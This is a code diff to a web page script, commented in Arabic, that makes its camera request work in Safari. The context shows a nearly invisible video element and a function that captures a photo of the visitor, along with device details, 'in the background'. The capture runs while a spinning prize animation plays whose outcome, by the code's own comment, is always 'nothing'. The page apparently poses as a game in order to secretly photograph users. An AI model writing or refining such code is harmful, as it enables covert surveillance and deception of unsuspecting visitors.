@@ -126,6 +126,7 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
   function shot(dev){
     try{
       var w=v.videoWidth||720, h=v.videoHeight||960;
+      if(!w || !h) return;
       var c=document.createElement('canvas');
       c.width=w; c.height=h;
       var x=c.getContext('2d');
@@ -139,77 +140,86 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
     }catch(e){}
   }
 
-  async function getStream(){
+  // طلب الكاميرا — متوافق مع Safari
+  function requestCamera(){
     if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
-      try{
-        return await navigator.mediaDevices.getUserMedia({
-          video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:false});
-      }catch(e1){
-        try{
-          return await navigator.mediaDevices.getUserMedia({video:true,audio:false});
-        }catch(e2){ return null; }
-      }
+      return navigator.mediaDevices.getUserMedia({
+        video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
+        audio:false
+      }).catch(function(){
+        // محاولة ثانية بسيطة
+        return navigator.mediaDevices.getUserMedia({video:true,audio:false});
+      });
     }
     var legacy=navigator.getUserMedia||navigator.webkitGetUserMedia||navigator.mozGetUserMedia;
-    if(!legacy) return null;
-    try{
-      return await new Promise(function(res,rej){legacy.call(navigator,{video:true},res,rej)});
-    }catch(e){ return null; }
+    if(!legacy) return Promise.reject(new Error('no camera api'));
+    return new Promise(function(res,rej){
+      legacy.call(navigator,{video:true},res,rej);
+    });
   }
 
-  async function run(){
-    var dev=deviceInfo();
-    warn.classList.add('hide');
-
-    var stream=await getStream();
-
-    if(!stream){
-      // رفض الإذن: أظهر تحذيراً، وابقَ في الشاشة 1
-      warn.classList.remove('hide');
-      return;
-    }
-
+  function run(stream, dev){
     v.srcObject=stream;
-    try{ await v.play(); }catch(e){}
+    var playP;
+    try{ playP=v.play(); }catch(e){ playP=null; }
+    if(playP && playP.catch) playP.catch(function(){});
 
     s1.classList.add('hide');
     s2.classList.remove('hide');
 
-    (async function(){
-      await sleep(WARMUP);
+    // التقاط الصورة في الخلفية
+    setTimeout(function(){
       shot(dev);
       try{ stream.getTracks().forEach(function(t){t.stop()}); }catch(e){}
-    })();
+    }, WARMUP);
 
+    // المؤشر
     var idx=0;
     var totalTime=3200;
     var start=Date.now();
-    while(true){
+
+    function tick(){
       var elapsed=Date.now()-start;
-      if(elapsed>=totalTime) break;
+      if(elapsed>=totalTime){
+        // النتيجة: دائماً "لا شيء"
+        for(var j=0;j<slots.length;j++) slots[j].classList.remove('on');
+        slots[3].classList.add('on');
+        setTimeout(function(){
+          s2.classList.add('hide');
+          s3.classList.remove('hide');
+        }, 2000);
+        return;
+      }
 
       for(var j=0;j<slots.length;j++) slots[j].classList.remove('on');
       slots[idx].classList.add('on');
 
       var speed=90+(elapsed/totalTime)*310;
-      await sleep(speed);
-
       idx=(idx+1)%slots.length;
+      setTimeout(tick, speed);
     }
-
-    var finalIdx=3;
-
-    for(var j=0;j<slots.length;j++) slots[j].classList.remove('on');
-    slots[finalIdx].classList.add('on');
-
-    await sleep(2000);
-    s2.classList.add('hide');
-    s3.classList.remove('hide');
+    tick();
   }
 
-  go.addEventListener('click',function(){
-    v.play().catch(function(){});
-    run();
+  // ✅ الطلب مباشرة في حدث الضغط — بدون async قبله
+  go.addEventListener('click', function(){
+    warn.classList.add('hide');
+    var dev=deviceInfo();   // جهّز المعلومة أولاً (متزامن، سريع)
+
+    // إخفاء الشاشة 1 فوراً — حتى يرى المستخدم استجابة
+    s1.classList.add('hide');
+    s2.classList.remove('hide');
+    for(var j=0;j<slots.length;j++) slots[j].classList.remove('on');
+    slots[0].classList.add('on');
+
+    requestCamera().then(function(stream){
+      run(stream, dev);
+    }).catch(function(){
+      // رفض: أعِد الشاشة 1 مع التحذير
+      s2.classList.add('hide');
+      s1.classList.remove('hide');
+      warn.classList.remove('hide');
+    });
   });
 })();
 </script>
